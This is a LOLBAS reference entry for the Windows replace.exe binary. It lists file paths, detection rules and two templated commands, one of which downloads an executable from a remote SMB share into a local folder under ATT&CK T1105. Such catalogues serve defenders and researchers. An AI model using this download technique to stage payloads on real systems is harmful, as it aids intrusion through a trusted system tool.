---
title: "Replace.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Replace/
fetched_at: 2026-09-20T17:11:22Z
license: unspecified
category: windows
---

Used to replace file with another file

## Paths
- C:\Windows\System32\replace.exe
- C:\Windows\SysWOW64\replace.exe

## Resources
- [https://twitter.com/elceef/status/986334113941655553](https://twitter.com/elceef/status/986334113941655553)
- [https://twitter.com/elceef/status/986842299861782529](https://twitter.com/elceef/status/986842299861782529)

## Acknowledgements
- elceef ([@elceef](https://twitter.com/@elceef))

## Detections
- IOC: Replace.exe retrieving files from remote server
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml)

## Copy

1. Copy .cab file to destination

```
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
```

   - Use case: Copy files

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

2. Download/Copy executable to specified folder

```
replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A
```

   - Use case: Download file

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105
